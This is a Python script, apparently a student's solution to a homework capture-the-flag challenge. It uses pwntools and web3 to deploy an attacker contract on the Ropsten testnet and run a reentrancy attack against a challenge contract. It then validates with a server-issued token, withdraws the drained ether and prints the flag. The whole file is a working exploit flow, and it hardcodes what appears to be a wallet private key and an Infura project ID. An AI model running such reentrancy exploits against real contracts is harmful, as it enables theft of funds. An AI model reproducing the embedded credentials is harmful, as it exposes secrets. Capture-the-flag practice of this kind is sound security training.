from pwn import *
from web3 import Web3, HTTPProvider
from solc import compile_files
import os
import time

myAddress = '0xB3580FB6944BC704149CE71DF2247897755Ba7d7'
myKey = '0x7613f3f0e75e124b78280cde672d5870ea87ebdea19aca556e1c6a720e8fbe82'
w3 = Web3(HTTPProvider(r'https://ropsten.infura.io/v3/6a17ad8ec1ff4b5c97d809725b515aac'))

def call(function, value):
    txn = function.buildTransaction({'value': w3.toWei(value, 'ether'), 'nonce': w3.eth.getTransactionCount(myAddress), 'gas': int(w3.eth.getBlock("latest").gasLimit * 0.9), 'gasPrice': w3.toWei('1000', 'gwei')})
    sign = w3.eth.account.sign_transaction(txn, myKey)
    return w3.eth.sendRawTransaction(sign.rawTransaction)

os.environ['SOLC_BINARY'] = '/mnt/c/Users/B10515025/Desktop/NTUST_CTF/HW3/solc.exe'
ALL_OUTPUT_VALUES = ("abi", "asm", "ast", "bin", "bin-runtime", "devdoc", "interface", "opcodes", "userdoc",)
ReEntrancy_sol = compile_files(['./ReEntrancy.sol'], output_values = ALL_OUTPUT_VALUES)
Hack_sol = compile_files(['./Hack.sol'], output_values = ALL_OUTPUT_VALUES)

server = remote('140.112.31.97',30003)
server.recvuntil('Address : ')
FactoryAddress = server.recvn(42).decode()
print(f"Factory Address: {FactoryAddress}")
server.recvuntil('validate(')
token = server.recvn(66).decode()
print(f"token: {token}")
server.recvuntil('----- flag will appear below -----')
ReEntrancyFactory = w3.eth.contract(address = FactoryAddress, abi = ReEntrancy_sol['./ReEntrancy.sol:ReEntrancyFactory']['abi'])
Hack = w3.eth.contract(abi = Hack_sol['./Hack.sol:Hack']['abi'], bytecode = Hack_sol['./Hack.sol:Hack']['bin'])

hash = call(Hack.constructor('Hack'), 0).hex()
while True:
    try:
        hackAddress = w3.eth.getTransactionReceipt(hash)['contractAddress']
        break
    except:
        time.sleep(1)
print(f"Hack Address: {hackAddress}")
Hack = w3.eth.contract(address = hackAddress, abi = Hack_sol['./Hack.sol:Hack']['abi'])

hash = call(Hack.functions.create(FactoryAddress), 0.5)
while True:
    try:
        w3.eth.getTransactionReceipt(hash)
        break
    except:
        time.sleep(1)
challenge = ReEntrancyFactory.functions.instances(hackAddress).call()
print(f"Challenge Address: {hackAddress}")

hash = call(Hack.functions.run(challenge), 0.5)
while True:
    try:
        w3.eth.getTransactionReceipt(hash)
        break
    except:
        time.sleep(1)

hash = call(Hack.functions.validate(FactoryAddress, int(token,16)), 0)
print("Validating...")
while True:
    try:
        w3.eth.getTransactionReceipt(hash)
        break
    except:
        time.sleep(1)

call(Hack.functions.withdraw(), 0)
flag = server.recvline().decode()
while len(flag) == 1:
    time.sleep(1)
    flag = server.recvline().decode()
print(flag)